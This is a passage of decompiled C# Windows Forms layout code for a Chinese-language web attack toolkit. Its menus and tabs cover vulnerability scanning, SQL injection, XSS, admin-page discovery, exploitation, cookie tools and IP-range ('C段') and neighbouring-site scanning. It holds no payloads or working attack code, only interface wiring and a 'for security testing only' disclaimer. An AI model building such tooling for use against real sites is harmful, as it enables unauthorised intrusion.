			this.tabPage1.SuspendLayout();
			this.groupBox12.SuspendLayout();
			this.groupBox11.SuspendLayout();
			this.groupBox1.SuspendLayout();
			this.groupBox2.SuspendLayout();
			this.contextMenuStrip1.SuspendLayout();
			this.groupBox6.SuspendLayout();
			this.tabPage9.SuspendLayout();
			this.tabPage3.SuspendLayout();
			this.groupBox4.SuspendLayout();
			this.groupBox7.SuspendLayout();
			this.tabPage6.SuspendLayout();
			this.groupBox13.SuspendLayout();
			this.groupBox10.SuspendLayout();
			this.groupBox9.SuspendLayout();
			this.groupBox3.SuspendLayout();
			this.tabPage4.SuspendLayout();
			this.contextMenuStrip4.SuspendLayout();
			this.tabPage5.SuspendLayout();
			this.tabPage7.SuspendLayout();
			this.groupBox8.SuspendLayout();
			this.tabPage8.SuspendLayout();
			this.tabControl1.SuspendLayout();
			this.tabPage10.SuspendLayout();
			this.contextMenuStrip5.SuspendLayout();
			this.contextMenuStrip6.SuspendLayout();
			base.SuspendLayout();
			this.listBox2.ContextMenuStrip = this.contextMenuStrip2;
			this.listBox2.FormattingEnabled = true;
			this.listBox2.ItemHeight = 12;
			this.listBox2.Location = new Point(10, 116);
			this.listBox2.Name = "listBox2";
			this.listBox2.Size = new Size(958, 316);
			this.listBox2.TabIndex = 5;
			this.contextMenuStrip2.Items.AddRange(new ToolStripItem[]
			{
				this.复制ToolStripMenuItem1,
				this.导出ToolStripMenuItem
			});
			this.contextMenuStrip2.Name = "contextMenuStrip2";
			this.contextMenuStrip2.Size = new Size(101, 48);
			this.复制ToolStripMenuItem1.Name = "复制ToolStripMenuItem1";
			this.复制ToolStripMenuItem1.Size = new Size(100, 22);
			this.复制ToolStripMenuItem1.Text = "复制";
			this.复制ToolStripMenuItem1.Click += new EventHandler(this.复制ToolStripMenuItem1_Click);
			this.导出ToolStripMenuItem.Name = "导出ToolStripMenuItem";
			this.导出ToolStripMenuItem.Size = new Size(100, 22);
			this.导出ToolStripMenuItem.Text = "导出";
			this.导出ToolStripMenuItem.Click += new EventHandler(this.导出ToolStripMenuItem_Click);
			this.textBox10.Location = new Point(415, 16);
			this.textBox10.Name = "textBox10";
			this.textBox10.Size = new Size(242, 21);
			this.textBox10.TabIndex = 10;
			this.button10.Location = new Point(281, 12);
			this.button10.Name = "button10";
			this.button10.Size = new Size(113, 31);
			this.button10.TabIndex = 8;
			this.button10.Text = "解析";
			this.button10.UseVisualStyleBackColor = true;
			this.button10.Click += new EventHandler(this.button10_Click);
			this.label30.AutoSize = true;
			this.label30.Location = new Point(923, 449);
			this.label30.Name = "label30";
			this.label30.Size = new Size(0, 12);
			this.label30.TabIndex = 4;
			this.progressBar4.Location = new Point(61, 442);
			this.progressBar4.Name = "progressBar4";
			this.progressBar4.Size = new Size(856, 23);
			this.progressBar4.TabIndex = 3;
			this.label29.AutoSize = true;
			this.label29.Location = new Point(8, 449);
			this.label29.Name = "label29";
			this.label29.Size = new Size(53, 12);
			this.label29.TabIndex = 2;
			this.label29.Text = "进度情况";
			this.button20.Location = new Point(545, 57);
			this.button20.Name = "button20";
			this.button20.Size = new Size(112, 30);
			this.button20.TabIndex = 9;
			this.button20.Text = "导出";
			this.button20.UseVisualStyleBackColor = true;
			this.button20.Click += new EventHandler(this.button20_Click);
			this.panel1.Controls.Add(this.splitMain);
			this.panel1.Controls.Add(this.toolStripData);
			this.panel1.Controls.Add(this.toolStripURL);
			this.panel1.Controls.Add(this.statusStripMain);
			this.panel1.Controls.Add(this.toolStripMain);
			this.panel1.Dock = DockStyle.Fill;
			this.panel1.Location = new Point(0, 0);
			this.panel1.Name = "panel1";
			this.panel1.Size = new Size(976, 490);
			this.panel1.TabIndex = 0;
			this.splitMain.BackColor = SystemColors.ButtonFace;
			this.splitMain.Dock = DockStyle.Fill;
			this.splitMain.Location = new Point(0, 50);
			this.splitMain.Name = "splitMain";
			this.splitMain.Panel1.BackColor = Color.WhiteSmoke;
			this.splitMain.Panel1.Controls.Add(this.treeViewToolTree);
			this.splitMain.Panel2.BackColor = Color.WhiteSmoke;
			this.splitMain.Panel2.Paint += new PaintEventHandler(this.splitMain_Panel2_Paint);
			this.splitMain.Size = new Size(976, 418);
			this.splitMain.SplitterDistance = 195;
			this.splitMain.TabIndex = 15;
			this.treeViewToolTree.Dock = DockStyle.Fill;
			this.treeViewToolTree.ImageIndex = 0;
			this.treeViewToolTree.ImageList = this.WCRImageList;
			this.treeViewToolTree.Location = new Point(0, 0);
			this.treeViewToolTree.Name = "treeViewToolTree";
			treeNode.ImageKey = "ie.png";
			treeNode.Name = "WebBrowser";
			treeNode.Text = "浏览器";
			treeNode2.ImageKey = "scan.png";
			treeNode2.Name = "Scanner";
			treeNode2.Text = "漏洞扫描";
			treeNode3.ImageKey = "db.png";
			treeNode3.Name = "SQL";
			treeNode3.Text = "SQL 注入";
			treeNode4.ImageKey = "xss.png";
			treeNode4.Name = "XSS";
			treeNode4.Text = "XSS脚本";
			treeNode5.ImageKey = "admin.png";
			treeNode5.Name = "Admin";
			treeNode5.Text = "获得管理页面";
			treeNode6.ImageKey = "sql.ico";
			treeNode6.Name = "POCTool";
			treeNode6.Text = "漏洞利用";
			treeNode7.ImageKey = "cookie.png";
			treeNode7.Name = "Cookie";
			treeNode7.Text = "Cookie工具";
			treeNode8.ImageKey = "code.png";
			treeNode8.Name = "Code";
			treeNode8.Text = "Code工具";
			treeNode9.ImageKey = "encode.png";
			treeNode9.Name = "StringTool";
			treeNode9.Text = "String工具";
			treeNode10.ImageKey = "tool.png";
			treeNode10.Name = "Setting";
			treeNode10.Text = "设置";
			treeNode11.ImageKey = "report.png";
			treeNode11.Name = "Report";
			treeNode11.Text = "报表";
			treeNode12.ImageKey = "设置.ico";
			treeNode12.Name = "SystemTool";
			treeNode12.Text = "系统工具";
			this.treeViewToolTree.Nodes.AddRange(new TreeNode[]
			{
				treeNode,
				treeNode2,
				treeNode6,
				treeNode12
			});
			this.treeViewToolTree.SelectedImageIndex = 0;
			this.treeViewToolTree.Size = new Size(195, 418);
			this.treeViewToolTree.TabIndex = 0;
			this.treeViewToolTree.AfterSelect += new TreeViewEventHandler(this.treeViewToolTree_AfterSelect_1);
			this.treeViewToolTree.NodeMouseDoubleClick += new TreeNodeMouseClickEventHandler(this.treeViewToolTree_NodeMouseDoubleClick);
			this.WCRImageList.ImageStream = (ImageListStreamer)resources.GetObject("WCRImageList.ImageStream");
			this.WCRImageList.TransparentColor = Color.Transparent;
			this.WCRImageList.Images.SetKeyName(0, "select.png");
			this.WCRImageList.Images.SetKeyName(1, "ie.png");
			this.WCRImageList.Images.SetKeyName(2, "scan.png");
			this.WCRImageList.Images.SetKeyName(3, "env.png");
			this.WCRImageList.Images.SetKeyName(4, "db.png");
			this.WCRImageList.Images.SetKeyName(5, "xss.png");
			this.WCRImageList.Images.SetKeyName(6, "cmd.png");
			this.WCRImageList.Images.SetKeyName(7, "admin.png");
			this.WCRImageList.Images.SetKeyName(8, "file.png");
			this.WCRImageList.Images.SetKeyName(9, "tool.png");
			this.WCRImageList.Images.SetKeyName(10, "code.png");
			this.WCRImageList.Images.SetKeyName(11, "about.png");
			this.WCRImageList.Images.SetKeyName(12, "go.png");
			this.WCRImageList.Images.SetKeyName(13, "start.png");
			this.WCRImageList.Images.SetKeyName(14, "pause.png");
			this.WCRImageList.Images.SetKeyName(15, "stop.png");
			this.WCRImageList.Images.SetKeyName(16, "table.png");
			this.WCRImageList.Images.SetKeyName(17, "column.png");
			this.WCRImageList.Images.SetKeyName(18, "vul.png");
			this.WCRImageList.Images.SetKeyName(19, "xml.png");
			this.WCRImageList.Images.SetKeyName(20, "report.png");
			this.WCRImageList.Images.SetKeyName(21, "cookie.png");
			this.WCRImageList.Images.SetKeyName(22, "resend.png");
			this.WCRImageList.Images.SetKeyName(23, "encode.png");
			this.WCRImageList.Images.SetKeyName(24, "设置.ico");
			this.WCRImageList.Images.SetKeyName(25, "sql.ico");
			this.WCRImageList.Images.SetKeyName(26, "Opera.ico");
			this.toolStripData.Items.AddRange(new ToolStripItem[]
			{
				this.lblSubmitData,
				this.toolStripSeparator2,
				this.txtSubmitData,
				this.toolStripSeparator16,
				this.ButtonAutoFill
			});
			this.toolStripData.Location = new Point(0, 50);
			this.toolStripData.Name = "toolStripData";
			this.toolStripData.Size = new Size(976, 25);
			this.toolStripData.TabIndex = 16;
			this.toolStripData.Visible = false;
			this.lblSubmitData.Name = "lblSubmitData";
			this.lblSubmitData.Size = new Size(35, 22);
			this.lblSubmitData.Text = "Data";
			this.toolStripSeparator2.Name = "toolStripSeparator2";
			this.toolStripSeparator2.Size = new Size(6, 25);
			this.txtSubmitData.AutoSize = false;
			this.txtSubmitData.Font = new Font("宋体", 9f, FontStyle.Regular, GraphicsUnit.Point, 134);
			this.txtSubmitData.Name = "txtSubmitData";
			this.txtSubmitData.Overflow = ToolStripItemOverflow.Never;
			this.txtSubmitData.Size = new Size(650, 25);
			this.txtSubmitData.ToolTipText = resources.GetString("txtSubmitData.ToolTipText");
			this.toolStripSeparator16.Name = "toolStripSeparator16";
			this.toolStripSeparator16.Size = new Size(6, 25);
			this.ButtonAutoFill.DisplayStyle = ToolStripItemDisplayStyle.Image;
			this.ButtonAutoFill.ImageTransparentColor = Color.Magenta;
			this.ButtonAutoFill.Name = "ButtonAutoFill";
			this.ButtonAutoFill.Size = new Size(23, 22);
			this.ButtonAutoFill.Text = "Fill in Form";
			this.toolStripURL.BackColor = Color.WhiteSmoke;
			this.toolStripURL.Items.AddRange(new ToolStripItem[]
			{
				this.toolStripLabel1,
				this.toolStripSeparator1,
				this.txtURL,
				this.toolStripSeparator3,
				this.cmbReqType,
				this.toolStripButton1,
				this.toolStripButton2,
				this.toolStripButton4
			});
			this.toolStripURL.Location = new Point(0, 25);
			this.toolStripURL.Name = "toolStripURL";
			this.toolStripURL.Size = new Size(976, 25);
			this.toolStripURL.TabIndex = 14;
			this.toolStripURL.Text = "toolStrip1";
			this.toolStripLabel1.Name = "toolStripLabel1";
			this.toolStripLabel1.Size = new Size(34, 22);
			this.toolStripLabel1.Text = "URL:";
			this.toolStripSeparator1.Name = "toolStripSeparator1";
			this.toolStripSeparator1.Size = new Size(6, 25);
			this.txtURL.AutoSize = false;
			this.txtURL.Name = "txtURL";
			this.txtURL.Overflow = ToolStripItemOverflow.Never;
			this.txtURL.Size = new Size(500, 25);
			this.toolStripSeparator3.Name = "toolStripSeparator3";
			this.toolStripSeparator3.Size = new Size(6, 25);
			this.cmbReqType.DropDownStyle = ComboBoxStyle.DropDownList;
			this.cmbReqType.Items.AddRange(new object[]
			{
				"GET",
				"POST",
				"COOKIE"
			});
			this.cmbReqType.Name = "cmbReqType";
			this.cmbReqType.Size = new Size(75, 25);
			this.cmbReqType.ToolTipText = "Request Type";
			this.toolStripButton1.ImageTransparentColor = Color.Magenta;
			this.toolStripButton1.Name = "toolStripButton1";
			this.toolStripButton1.Size = new Size(60, 22);
			this.toolStripButton1.Text = "打开网址";
			this.toolStripButton1.ToolTipText = "Resend Tool";
			this.toolStripButton1.Click += new EventHandler(this.toolStripButton1_Click);
			this.toolStripButton2.ImageTransparentColor = Color.Magenta;
			this.toolStripButton2.Name = "toolStripButton2";
			this.toolStripButton2.Size = new Size(60, 22);
			this.toolStripButton2.Text = "扫描暂停";
			this.toolStripButton2.ToolTipText = "Resend Tool";
			this.toolStripButton2.Click += new EventHandler(this.toolStripButton2_Click);
			this.toolStripButton4.ImageTransparentColor = Color.Magenta;
			this.toolStripButton4.Name = "toolStripButton4";
			this.toolStripButton4.Size = new Size(60, 22);
			this.toolStripButton4.Text = "扫描停止";
			this.toolStripButton4.ToolTipText = "Resend Tool";
			this.toolStripButton4.Click += new EventHandler(this.toolStripButton4_Click);
			this.statusStripMain.Items.AddRange(new ToolStripItem[]
			{
				this.toolStripStatusProgress,
				this.toolStripStatusSep1,
				this.lblThreadNum
			});
			this.statusStripMain.Location = new Point(0, 468);
			this.statusStripMain.Name = "statusStripMain";
			this.statusStripMain.Size = new Size(976, 22);
			this.statusStripMain.TabIndex = 13;
			this.statusStripMain.Text = "statusStrip1";
			this.toolStripStatusProgress.AutoSize = false;
			this.toolStripStatusProgress.Name = "toolStripStatusProgress";
			this.toolStripStatusProgress.Size = new Size(642, 17);
			this.toolStripStatusProgress.Text = "Done";
			this.toolStripStatusProgress.TextAlign = ContentAlignment.MiddleLeft;
			this.toolStripStatusSep1.ForeColor = SystemColors.ControlDark;
			this.toolStripStatusSep1.Name = "toolStripStatusSep1";
			this.toolStripStatusSep1.Size = new Size(11, 17);
			this.toolStripStatusSep1.Text = "|";
			this.lblThreadNum.AutoSize = false;
			this.lblThreadNum.Name = "lblThreadNum";
			this.lblThreadNum.Size = new Size(125, 17);
			this.lblThreadNum.TextAlign = ContentAlignment.MiddleLeft;
			this.toolStripMain.BackColor = Color.WhiteSmoke;
			this.toolStripMain.Items.AddRange(new ToolStripItem[]
			{
				this.toolStripButtonBrowser,
				this.toolStripButtonScanner,
				this.toolStripSeparator10,
				this.toolStripButtonSQL,
				this.toolStripSeparator20,
				this.toolStripButtonXSS,
				this.toolStripSeparator11,
				this.ButtonCookie,
				this.toolStripSeparator17,
				this.ButtonSetting,
				this.toolStripSeparator13,
				this.toolStripSeparator15,
				this.ButtonScanURL,
				this.toolStripSeparator14,
				this.ButtonScanSite
			});
			this.toolStripMain.Location = new Point(0, 0);
			this.toolStripMain.Name = "toolStripMain";
			this.toolStripMain.Size = new Size(976, 25);
			this.toolStripMain.TabIndex = 12;
			this.toolStripMain.Text = "toolStrip1";
			this.toolStripButtonBrowser.ImageTransparentColor = Color.Magenta;
			this.toolStripButtonBrowser.Name = "toolStripButtonBrowser";
			this.toolStripButtonBrowser.Size = new Size(48, 22);
			this.toolStripButtonBrowser.Text = "浏览器";
			this.toolStripButtonBrowser.ToolTipText = "Web Browser";
			this.toolStripButtonBrowser.Click += new EventHandler(this.toolStripButtonBrowser_Click);
			this.toolStripButtonScanner.ImageTransparentColor = Color.Magenta;
			this.toolStripButtonScanner.Name = "toolStripButtonScanner";
			this.toolStripButtonScanner.Size = new Size(36, 22);
			this.toolStripButtonScanner.Text = "扫描";
			this.toolStripButtonScanner.ToolTipText = "Vulnerability Scanner";
			this.toolStripButtonScanner.Click += new EventHandler(this.toolStripButtonScanner_Click);
			this.toolStripSeparator10.Name = "toolStripSeparator10";
			this.toolStripSeparator10.Size = new Size(6, 25);
			this.toolStripButtonSQL.ImageTransparentColor = Color.Magenta;
			this.toolStripButtonSQL.Name = "toolStripButtonSQL";
			this.toolStripButtonSQL.Size = new Size(35, 22);
			this.toolStripButtonSQL.Text = "SQL";
			this.toolStripButtonSQL.ToolTipText = "sql 注入";
			this.toolStripButtonSQL.Click += new EventHandler(this.toolStripButtonSQL_Click);
			this.toolStripSeparator20.Name = "toolStripSeparator20";
			this.toolStripSeparator20.Size = new Size(6, 25);
			this.toolStripButtonXSS.ImageTransparentColor = Color.Magenta;
			this.toolStripButtonXSS.Name = "toolStripButtonXSS";
			this.toolStripButtonXSS.Size = new Size(34, 22);
			this.toolStripButtonXSS.Text = "XSS";
			this.toolStripButtonXSS.ToolTipText = "Cross Site Scripting";
			this.toolStripButtonXSS.Click += new EventHandler(this.toolStripButtonXSS_Click);
			this.toolStripSeparator11.Name = "toolStripSeparator11";
			this.toolStripSeparator11.Size = new Size(6, 25);
			this.ButtonCookie.ImageTransparentColor = Color.Magenta;
			this.ButtonCookie.Name = "ButtonCookie";
			this.ButtonCookie.Size = new Size(53, 22);
			this.ButtonCookie.Text = "Cookie";
			this.ButtonCookie.Click += new EventHandler(this.ButtonCookie_Click);
			this.toolStripSeparator17.Name = "toolStripSeparator17";
			this.toolStripSeparator17.Size = new Size(6, 25);
			this.ButtonSetting.ImageTransparentColor = Color.Magenta;
			this.ButtonSetting.Name = "ButtonSetting";
			this.ButtonSetting.Size = new Size(36, 22);
			this.ButtonSetting.Text = "设置";
			this.ButtonSetting.Click += new EventHandler(this.ButtonSetting_Click);
			this.toolStripSeparator13.Name = "toolStripSeparator13";
			this.toolStripSeparator13.Size = new Size(6, 25);
			this.toolStripSeparator15.Alignment = ToolStripItemAlignment.Right;
			this.toolStripSeparator15.Name = "toolStripSeparator15";
			this.toolStripSeparator15.Size = new Size(6, 25);
			this.ButtonScanURL.Alignment = ToolStripItemAlignment.Right;
			this.ButtonScanURL.ImageTransparentColor = Color.Magenta;
			this.ButtonScanURL.Name = "ButtonScanURL";
			this.ButtonScanURL.Size = new Size(59, 22);
			this.ButtonScanURL.Text = "扫描URL";
			this.ButtonScanURL.ToolTipText = "Scan Current URL";
			this.ButtonScanURL.Click += new EventHandler(this.ButtonScanURL_Click);
			this.toolStripSeparator14.Alignment = ToolStripItemAlignment.Right;
			this.toolStripSeparator14.Name = "toolStripSeparator14";
			this.toolStripSeparator14.Size = new Size(6, 25);
			this.ButtonScanSite.Alignment = ToolStripItemAlignment.Right;
			this.ButtonScanSite.ImageTransparentColor = Color.Magenta;
			this.ButtonScanSite.Name = "ButtonScanSite";
			this.ButtonScanSite.Size = new Size(60, 22);
			this.ButtonScanSite.Text = "扫描网站";
			this.ButtonScanSite.ToolTipText = "Scan Current Site";
			this.ButtonScanSite.Click += new EventHandler(this.ButtonScanSite_Click);
			this.button9.Location = new Point(415, 57);
			this.button9.Name = "button9";
			this.button9.Size = new Size(115, 30);
			this.button9.TabIndex = 7;
			this.button9.Text = "停止";
			this.button9.UseVisualStyleBackColor = true;
			this.button9.Click += new EventHandler(this.button9_Click);
			this.button3.Location = new Point(281, 57);
			this.button3.Name = "button3";
			this.button3.Size = new Size(115, 31);
			this.button3.TabIndex = 6;
			this.button3.Text = "查询";
			this.button3.UseVisualStyleBackColor = true;
			this.button3.Click += new EventHandler(this.button3_Click);
			this.textBox9.Location = new Point(78, 73);
			this.textBox9.Name = "textBox9";
			this.textBox9.Size = new Size(187, 21);
			this.textBox9.TabIndex = 5;
			this.textBox8.Location = new Point(78, 44);
			this.textBox8.Name = "textBox8";
			this.textBox8.Size = new Size(187, 21);
			this.textBox8.TabIndex = 4;
			this.textBox7.Location = new Point(78, 16);
			this.textBox7.Name = "textBox7";
			this.textBox7.Size = new Size(187, 21);
			this.textBox7.TabIndex = 3;
			this.label28.AutoSize = true;
			this.label28.Location = new Point(7, 76);
			this.label28.Name = "label28";
			this.label28.Size = new Size(65, 12);
			this.label28.TabIndex = 2;
			this.label28.Text = "结束  IP：";
			this.label27.AutoSize = true;
			this.label27.Location = new Point(9, 49);
			this.label27.Name = "label27";
			this.label27.Size = new Size(65, 12);
			this.label27.TabIndex = 1;
			this.label27.Text = "开始  IP：";
			this.label26.AutoSize = true;
			this.label26.Location = new Point(7, 21);
			this.label26.Name = "label26";
			this.label26.Size = new Size(65, 12);
			this.label26.TabIndex = 0;
			this.label26.Text = "开始域名：";
			this.label22.AutoSize = true;
			this.label22.Location = new Point(677, 22);
			this.label22.Name = "label22";
			this.label22.Size = new Size(65, 12);
			this.label22.TabIndex = 11;
			this.label22.Text = "扫描脚本：";
			this.comboBox2.FormattingEnabled = true;
			this.comboBox2.Items.AddRange(new object[]
			{
				"All",
				"asp",
				"aspx",
				"php",
				"jsp"
			});
			this.comboBox2.Location = new Point(739, 19);
			this.comboBox2.Name = "comboBox2";
			this.comboBox2.Size = new Size(94, 20);
			this.comboBox2.TabIndex = 12;
			this.comboBox2.Text = "All";
			this.listView2.ContextMenuStrip = this.contextMenuStrip3;
			this.listView2.Location = new Point(167, 56);
			this.listView2.Name = "listView2";
			this.listView2.Size = new Size(803, 358);
			this.listView2.TabIndex = 20;
			this.listView2.UseCompatibleStateImageBehavior = false;
			this.contextMenuStrip3.Items.AddRange(new ToolStripItem[]
			{
				this.打开网址ToolStripMenuItem,
				this.toolStripMenuItem1,
				this.导出ToolStripMenuItem1
			});
			this.contextMenuStrip3.Name = "contextMenuStrip3";
			this.contextMenuStrip3.Size = new Size(101, 70);
			this.打开网址ToolStripMenuItem.Name = "打开网址ToolStripMenuItem";
			this.打开网址ToolStripMenuItem.Size = new Size(100, 22);
			this.打开网址ToolStripMenuItem.Text = "打开";
			this.打开网址ToolStripMenuItem.Click += new EventHandler(this.打开网址ToolStripMenuItem_Click);
			this.toolStripMenuItem1.Name = "toolStripMenuItem1";
			this.toolStripMenuItem1.Size = new Size(100, 22);
			this.toolStripMenuItem1.Text = "复制";
			this.toolStripMenuItem1.Click += new EventHandler(this.toolStripMenuItem1_Click);
			this.导出ToolStripMenuItem1.Name = "导出ToolStripMenuItem1";
			this.导出ToolStripMenuItem1.Size = new Size(100, 22);
			this.导出ToolStripMenuItem1.Text = "导出";
			this.导出ToolStripMenuItem1.Click += new EventHandler(this.导出ToolStripMenuItem1_Click);
			this.button22.Location = new Point(420, 6);
			this.button22.Name = "button22";
			this.button22.Size = new Size(117, 40);
			this.button22.TabIndex = 20;
			this.button22.Text = "扫描停止";
			this.button22.UseVisualStyleBackColor = true;
			this.button22.Click += new EventHandler(this.button22_Click);
			this.button24.Location = new Point(141, 6);
			this.button24.Name = "button24";
			this.button24.Size = new Size(117, 40);
			this.button24.TabIndex = 21;
			this.button24.Text = "C段导入";
			this.button24.UseVisualStyleBackColor = true;
			this.button24.Click += new EventHandler(this.button24_Click);
			this.button12.Location = new Point(280, 6);
			this.button12.Name = "button12";
			this.button12.Size = new Size(117, 40);
			this.button12.TabIndex = 2;
			this.button12.Text = "后台扫描";
			this.button12.UseVisualStyleBackColor = true;
			this.button12.Click += new EventHandler(this.button12_Click);
			this.label20.AutoSize = true;
			this.label20.Location = new Point(174, 429);
			this.label20.Name = "label20";
			this.label20.Size = new Size(0, 12);
			this.label20.TabIndex = 19;
			this.tabPage2.Controls.Add(this.listBox2);
			this.tabPage2.Controls.Add(this.label30);
			this.tabPage2.Controls.Add(this.progressBar4);
			this.tabPage2.Controls.Add(this.label29);
			this.tabPage2.Controls.Add(this.groupBox5);
			this.tabPage2.Location = new Point(4, 39);
			this.tabPage2.Name = "tabPage2";
			this.tabPage2.Size = new Size(976, 490);
			this.tabPage2.TabIndex = 9;
			this.tabPage2.Text = " C段查询 ";
			this.tabPage2.UseVisualStyleBackColor = true;
			this.groupBox5.Controls.Add(this.comboBox2);
			this.groupBox5.Controls.Add(this.label22);
			this.groupBox5.Controls.Add(this.textBox10);
			this.groupBox5.Controls.Add(this.button20);
			this.groupBox5.Controls.Add(this.button10);
			this.groupBox5.Controls.Add(this.button9);
			this.groupBox5.Controls.Add(this.button3);
			this.groupBox5.Controls.Add(this.textBox9);
			this.groupBox5.Controls.Add(this.textBox8);
			this.groupBox5.Controls.Add(this.textBox7);
			this.groupBox5.Controls.Add(this.label28);
			this.groupBox5.Controls.Add(this.label27);
			this.groupBox5.Controls.Add(this.label26);
			this.groupBox5.Location = new Point(8, 8);
			this.groupBox5.Name = "groupBox5";
			this.groupBox5.Size = new Size(960, 101);
			this.groupBox5.TabIndex = 0;
			this.groupBox5.TabStop = false;
			this.groupBox5.Text = "C段";
			this.button11.Location = new Point(3, 6);
			this.button11.Name = "button11";
			this.button11.Size = new Size(117, 41);
			this.button11.TabIndex = 1;
			this.button11.Text = "旁站导入";
			this.button11.UseVisualStyleBackColor = true;
			this.button11.Click += new EventHandler(this.button11_Click);
			this.button1.Location = new Point(555, 7);
			this.button1.Name = "button1";
			this.button1.Size = new Size(117, 40);
			this.button1.TabIndex = 6;
			this.button1.Text = "外部导入列表";
			this.button1.UseVisualStyleBackColor = true;
			this.button1.Click += new EventHandler(this.button1_Click);
			this.tabPage1.Controls.Add(this.groupBox12);
			this.tabPage1.Controls.Add(this.listView1);
			this.tabPage1.Controls.Add(this.label16);
			this.tabPage1.Controls.Add(this.progressBar1);
			this.tabPage1.Controls.Add(this.groupBox6);
			this.tabPage1.Controls.Add(this.label5);
			this.tabPage1.Controls.Add(this.label4);
			this.tabPage1.Location = new Point(4, 39);
			this.tabPage1.Name = "tabPage1";
			this.tabPage1.Padding = new Padding(3);
			this.tabPage1.Size = new Size(976, 490);
			this.tabPage1.TabIndex = 0;
			this.tabPage1.Text = "旁站和二级查询";
			this.tabPage1.UseVisualStyleBackColor = true;
			this.groupBox12.Controls.Add(this.groupBox11);
			this.groupBox12.Controls.Add(this.groupBox1);
			this.groupBox12.Controls.Add(this.groupBox2);
			this.groupBox12.Location = new Point(680, 11);
			this.groupBox12.Name = "groupBox12";
			this.groupBox12.Size = new Size(283, 433);
			this.groupBox12.TabIndex = 20;
			this.groupBox12.TabStop = false;
			this.groupBox12.Text = "功能块";
			this.groupBox11.Controls.Add(this.label36);
			this.groupBox11.Controls.Add(this.label35);
			this.groupBox11.Controls.Add(this.label34);
			this.groupBox11.Controls.Add(this.label33);
			this.groupBox11.Controls.Add(this.label32);
			this.groupBox11.Controls.Add(this.label31);
			this.groupBox11.Location = new Point(6, 19);
			this.groupBox11.Name = "groupBox11";
			this.groupBox11.Size = new Size(274, 144);
			this.groupBox11.TabIndex = 19;
			this.groupBox11.TabStop = false;
			this.groupBox11.Text = "服务器类型";
			this.label36.AutoSize = true;
			this.label36.Location = new Point(83, 112);
			this.label36.Name = "label36";
			this.label36.Size = new Size(29, 12);
			this.label36.TabIndex = 5;
			this.label36.Text = "null";
			this.label35.AutoSize = true;
			this.label35.Location = new Point(81, 73);
			this.label35.Name = "label35";
			this.label35.Size = new Size(29, 12);
			this.label35.TabIndex = 4;
			this.label35.Text = "null";
			this.label34.AutoSize = true;
			this.label34.Location = new Point(79, 41);
			this.label34.Name = "label34";
			this.label34.Size = new Size(29, 12);
			this.label34.TabIndex = 3;
			this.label34.Text = "null";
			this.label33.AutoSize = true;
			this.label33.Location = new Point(12, 113);
			this.label33.Name = "label33";
			this.label33.Size = new Size(71, 12);
			this.label33.TabIndex = 2;
			this.label33.Text = "环境 平台：";
			this.label32.AutoSize = true;
			this.label32.Location = new Point(12, 74);
			this.label32.Name = "label32";
			this.label32.Size = new Size(77, 12);
			this.label32.TabIndex = 1;
			this.label32.Text = "服务器系统：";
			this.label31.AutoSize = true;
			this.label31.Location = new Point(12, 41);
			this.label31.Name = "label31";
			this.label31.Size = new Size(77, 12);
			this.label31.TabIndex = 0;
			this.label31.Text = "目标IP地址：";
			this.groupBox1.Controls.Add(this.button16);
			this.groupBox1.Controls.Add(this.textBox4);
			this.groupBox1.Controls.Add(this.button15);
			this.groupBox1.Controls.Add(this.label9);
			this.groupBox1.Location = new Point(6, 170);
			this.groupBox1.Name = "groupBox1";
			this.groupBox1.Size = new Size(274, 114);
			this.groupBox1.TabIndex = 13;
			this.groupBox1.TabStop = false;
			this.groupBox1.Text = "网址添加删除";
			this.button16.Location = new Point(123, 60);
			this.button16.Name = "button16";
			this.button16.Size = new Size(107, 34);
			this.button16.TabIndex = 12;
			this.button16.Text = "删除";
			this.button16.UseVisualStyleBackColor = true;
			this.button16.Click += new EventHandler(this.button16_Click);
			this.textBox4.Location = new Point(81, 20);
			this.textBox4.Name = "textBox4";
			this.textBox4.Size = new Size(149, 21);
			this.textBox4.TabIndex = 9;
			this.button15.Location = new Point(10, 60);
			this.button15.Name = "button15";
			this.button15.Size = new Size(95, 34);
			this.button15.TabIndex = 11;
			this.button15.Text = "添加";
			this.button15.UseVisualStyleBackColor = true;
			this.button15.Click += new EventHandler(this.button15_Click);
			this.label9.AutoSize = true;
			this.label9.Location = new Point(10, 29);
			this.label9.Name = "label9";
			this.label9.Size = new Size(65, 12);
			this.label9.TabIndex = 10;
			this.label9.Text = "网址添加：";
			this.groupBox2.Controls.Add(this.label12);
			this.groupBox2.Controls.Add(this.label11);
			this.groupBox2.Location = new Point(6, 290);
			this.groupBox2.Name = "groupBox2";
			this.groupBox2.Size = new Size(274, 133);
			this.groupBox2.TabIndex = 14;
			this.groupBox2.TabStop = false;
			this.groupBox2.Text = "备注说明";
			this.label12.AutoSize = true;
			this.label12.Location = new Point(10, 44);
			this.label12.Name = "label12";
			this.label12.Size = new Size(257, 84);
			this.label12.TabIndex = 1;
			this.label12.Text = "  此软件只供安全测试使用，如果软件对其站点\r\n\r\n进行恶意攻击与本人无关，如软件使用遇到问题\r\n\r\n或好的建议，请及时与本人联系，谢谢！\r\n\r\n                   ";
			this.label11.AutoSize = true;
			this.label11.Location = new Point(79, 17);
			this.label11.Name = "label11";
			this.label11.Size = new Size(77, 12);
			this.label11.TabIndex = 0;
			this.label11.Text = "关于软件说明";
			this.listView1.ContextMenuStrip = this.contextMenuStrip1;
			this.listView1.Location = new Point(3, 47);
			this.listView1.Name = "listView1";
			this.listView1.Size = new Size(671, 397);
			this.listView1.TabIndex = 18;
			this.listView1.UseCompatibleStateImageBehavior = false;
			this.contextMenuStrip1.Items.AddRange(new ToolStripItem[]
			{
				this.打开ToolStripMenuItem1,
				this.复制ToolStripMenuItem,
				this.导出ToolStripMenuItem4
			});
			this.contextMenuStrip1.Name = "contextMenuStrip1";
			this.contextMenuStrip1.Size = new Size(101, 70);
			this.打开ToolStripMenuItem1.Name = "打开ToolStripMenuItem1";
			this.打开ToolStripMenuItem1.Size = new Size(100, 22);
			this.打开ToolStripMenuItem1.Text = "打开";
			this.打开ToolStripMenuItem1.Click += new EventHandler(this.打开ToolStripMenuItem1_Click);
			this.复制ToolStripMenuItem.Name = "复制ToolStripMenuItem";
			this.复制ToolStripMenuItem.Size = new Size(100, 22);
			this.复制ToolStripMenuItem.Text = "复制";
			this.复制ToolStripMenuItem.Click += new EventHandler(this.复制ToolStripMenuItem_Click);
			this.导出ToolStripMenuItem4.Name = "导出ToolStripMenuItem4";
			this.导出ToolStripMenuItem4.Size = new Size(100, 22);
			this.导出ToolStripMenuItem4.Text = "导出";
			this.导出ToolStripMenuItem4.Click += new EventHandler(this.导出ToolStripMenuItem4_Click);
